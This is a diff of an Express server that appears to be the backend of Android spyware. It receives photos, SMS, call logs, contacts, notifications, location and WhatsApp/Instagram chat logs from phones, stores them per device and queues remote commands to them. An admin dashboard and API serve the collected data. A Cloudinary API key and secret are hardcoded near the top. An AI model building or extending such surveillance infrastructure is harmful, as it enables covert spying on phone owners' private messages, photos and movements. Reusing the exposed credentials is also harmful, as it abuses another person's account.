@@ -10,9 +10,9 @@ const PORT = process.env.PORT || 3000;
 
 // --- 1. CLOUDINARY CONFIG (Tumhari Keys) ---
 cloudinary.config({
-  cloud_name: 'dxnh5vuik',
-  api_key: '185953318184881',
-  api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
+    cloud_name: 'dxnh5vuik',
+    api_key: '185953318184881',
+    api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
 });
 
 // --- 2. SETUP & MIDDLEWARE ---
@@ -21,25 +21,24 @@ if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);
 
 app.use(cors({ origin: '*' }));
 
-// Limits badha di hain (Heavy HD photos ke liye zaroori hai)
+// Heavy files ke liye limit badha di hai
 app.use(bodyParser.json({ limit: '100mb' }));
 app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
 app.use(express.static(__dirname));
 
-// Live Status (RAM Storage)
+// Live Status (RAM Storage - Temporary)
 let devicesStatus = {}; 
 
 // --- 3. ROOT ROUTE ---
 app.get('/', (req, res) => {
-    res.send('✅ Server is Running Successfully with HD Cloudinary Gallery!');
+    res.send('✅ Server is Running Successfully (Chat & HD Gallery Ready)!');
 });
 
 // ==================================================
-//  GALLERY SYSTEM (UPDATED FOR HD & PAGINATION)
+//  GALLERY SYSTEM (HD PHOTOS)
 // ==================================================
 
-// A. PHOTO UPLOAD (Android -> Cloudinary)
-// Ye route tumhare naye 'GalleryUploader.java' se connect karega
+// A. PHOTO UPLOAD
 app.post('/api/upload-image', (req, res) => {
     let { device_id, image_data } = req.body;
 
@@ -49,86 +48,78 @@ app.post('/api/upload-image', (req, res) => {
 
     const id = device_id.toString().trim().toUpperCase();
 
-    // Base64 Prefix Fix (Agar app ne nahi bheja to hum laga denge)
+    // Base64 check
     let base64Image = image_data;
     if (!base64Image.startsWith('data:image')) {
         base64Image = "data:image/jpeg;base64," + image_data;
     }
 
-    // Upload to Cloudinary (HD SETTINGS)
+    // Cloudinary Upload (HD Settings)
     cloudinary.uploader.upload(base64Image, 
         { 
-            folder: id,             // Device ID ka folder banega
-            public_id: Date.now().toString(), // Time ke hisab se naam (Sorting ke liye)
+            folder: id,
+            public_id: Date.now().toString(), 
             resource_type: "image",
-            width: 1280,            // ✅ HD Width (Clear Text & Faces)
-            quality: "auto",        // ✅ Auto Best Quality
-            fetch_format: "auto"    // ✅ WebP/JPG auto convert (Fast loading)
+            width: 1280,            // ✅ HD Quality
+            quality: "auto",
+            fetch_format: "auto"
         },
         function(error, result) {
             if (error) {
                 console.error("❌ Cloudinary Upload Error:", error);
                 return res.status(500).json({ error: "Upload Failed" });
             }
-            console.log(`📸 [GALLERY] HD Photo Saved for ${id} -> ${result.secure_url}`);
+            console.log(`📸 [GALLERY] HD Photo Saved for ${id}`);
             res.json({ status: "success", url: result.secure_url });
         }
     );
 });
 
-// B. GALLERY LIST (Website -> Cloudinary)
-// Ye route "Load More" button ke liye data dega
+// B. GALLERY LIST (Website ke liye)
 app.get('/api/gallery-list/:device_id', (req, res) => {
     const id = req.params.device_id.toUpperCase();
-    const next_cursor = req.query.next_cursor || null; // Pagination ke liye
+    const next_cursor = req.query.next_cursor || null;
 
-    // Cloudinary se photos mangwana
     cloudinary.api.resources({
         type: 'upload',
-        prefix: id + "/",      // Sirf is device ki photos
-        max_results: 20,       // ✅ Ek baar mein 20 photos (Load More logic)
+        prefix: id + "/",      
+        max_results: 20,       
         next_cursor: next_cursor, 
-        direction: 'desc',     // ✅ Newest First (Sabse nayi photo sabse upar)
+        direction: 'desc',     // Nayi photo sabse upar
         context: true
     }, 
     function(error, result) {
         if (error) {
-            console.error("Cloudinary Fetch Error:", error);
-            // Agar folder nahi mila ya error aaya to empty list bhejo
             return res.json({ photos: [], next_cursor: null });
         }
-
-        // Sirf URLs nikal kar bhejo
         const photos = result.resources.map(img => img.secure_url);
-        
         res.json({ 
             photos: photos, 
-            next_cursor: result.next_cursor // Ye token agli 20 photos ke liye hai
+            next_cursor: result.next_cursor 
         });
     });
 });
 
 // ==================================================
-//  ADMIN DASHBOARD & STATUS
+//  ADMIN DASHBOARD & STATUS (Online/Offline)
 // ==================================================
 
-// Get All Devices
 app.get('/api/admin/all-devices', (req, res) => {
     res.json(devicesStatus);
 });
 
-// Single Device Status
 app.get('/api/device-status/:id', (req, res) => {
     const id = req.params.id.toUpperCase().trim();
     const device = devicesStatus[id];
     
     if (!device) return res.json({ id: id, isOnline: false });
     
+    // Agar 60 second se purana ping hai to offline maano
     const isOnline = (Date.now() - device.lastSeen) < 60000;
     res.json({ ...device, isOnline: isOnline });
 });
 
-// PHONE PING (Connection & Commands)
+// PHONE PING (Heartbeat)
 app.post('/api/status', (req, res) => {
     try {
         let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
@@ -137,14 +128,14 @@ app.post('/api/status', (req, res) => {
 
         const id = device_id.toString().trim().toUpperCase();
         
-        // Command Check
+        // Command Check (Agar admin ne kuch bheja hai)
         let pendingCommand = "none";
         if (devicesStatus[id] && devicesStatus[id].command) {
             pendingCommand = devicesStatus[id].command;
-            devicesStatus[id].command = "none"; // Command bhej diya, ab clear kar do
+            devicesStatus[id].command = "none"; 
         }
 
-        // Update RAM Data
+        // RAM Data Update
         devicesStatus[id] = {
             ...devicesStatus[id], 
             id: id,
@@ -158,10 +149,6 @@ app.post('/api/status', (req, res) => {
             command: devicesStatus[id]?.command || "none" 
         };
 
-        if(pendingCommand !== "none") {
-            console.log(`📡 [PING] ${id} Command Sent: ${pendingCommand}`);
-        }
-
         res.json({ status: "success", command: pendingCommand });
 
     } catch (e) {
@@ -170,26 +157,21 @@ app.post('/api/status', (req, res) => {
     }
 });
 
-// Send Command (Admin Panel se)
 app.post('/api/send-command', (req, res) => {
     let { device_id, command } = req.body;
-    
     if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
     
     const id = device_id.toUpperCase().trim();
-    
-    if (!devicesStatus[id]) {
-        devicesStatus[id] = { id: id, lastSeen: 0 };
-    }
+    if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
     
     devicesStatus[id].command = command;
-    console.log(`🚀 [ADMIN] Sending Command '${command}' to Device ${id}`);
-    
+    console.log(`🚀 [ADMIN] Command '${command}' sent to ${id}`);
     res.json({ status: "success", command: command });
 });
 
 // ==================================================
-//  DATA STORAGE (SMS, Logs, Location)
+//  🔥 DATA STORAGE (MAIN PART)
+//  WhatsApp/Insta Chat, SMS, Location
 // ==================================================
 
 app.post('/api/upload_data', (req, res) => {
@@ -203,7 +185,7 @@ app.post('/api/upload_data', (req, res) => {
     try {
         let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
 
-        // Location Update in Memory
+        // 1. LOCATION (Isme history nahi chahiye, bas latest kaafi hai)
         if (type === 'location') {
             const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
             if (locObj && (locObj.lat || locObj.latitude)) {
@@ -211,24 +193,47 @@ app.post('/api/upload_data', (req, res) => {
                 devicesStatus[id].lat = locObj.lat || locObj.latitude;
                 devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
             }
+            // Purana delete karke naya save karo
+            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
         }
         
-        // Append Mode (Logs history maintain karne ke liye)
-        if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
+        // 2. CHAT LOGS, SMS, CONTACTS (Isme History chahiye)
+        else if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
             let existingData = [];
+            
+            // Agar pehle se file hai, to uska data read karo
             if (fs.existsSync(filePath)) {
                 try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
             }
-            const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
             
-            // Naya data upar, purana neeche (Max 2000 records)
-            const finalData = [...newDataArray, ...existingData].slice(0, 2000); 
+            let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
+
+            // 🔥 CHAT LOGS SPECIAL: Time add karo agar nahi hai
+            if (type === 'chat_logs') {
+                newDataArray = newDataArray.map(msg => ({
+                    ...msg,
+                    timestamp: msg.timestamp || Date.now() // Sorting ke liye time zaroori hai
+                }));
+            }
             
+            // 🔥 MERGE: Purana data + Naya Data (Append)
+            let finalData;
+            if (type === 'chat_logs') {
+                // Chats me naya neeche judega (WhatsApp jaisa)
+                finalData = [...existingData, ...newDataArray]; 
+                
+                // File zyada bhari na ho, isliye last 5000 messages rakhenge
+                if (finalData.length > 5000) finalData = finalData.slice(finalData.length - 5000);
+            } else {
+                // SMS ya Call logs me naya upar rakhna behtar hai
+                finalData = [...newDataArray, ...existingData].slice(0, 2000); 
+            }
+
             fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
-            console.log(`✅ [DATA] ${type} saved for ${id}`);
+            console.log(`✅ [DATA] ${type} saved for ${id} (Total: ${finalData.length})`);
         } 
         else {
-            // Overwrite Mode (Location etc)
+            // Baaki types ke liye direct save
             fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
         }
 
@@ -239,7 +244,7 @@ app.post('/api/upload_data', (req, res) => {
     }
 });
 
-// Get Data for Website
+// Website ko Data dene ke liye API
 app.get('/api/get-data/:device_id/:type', (req, res) => {
     const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
     if (fs.existsSync(filePath)) {
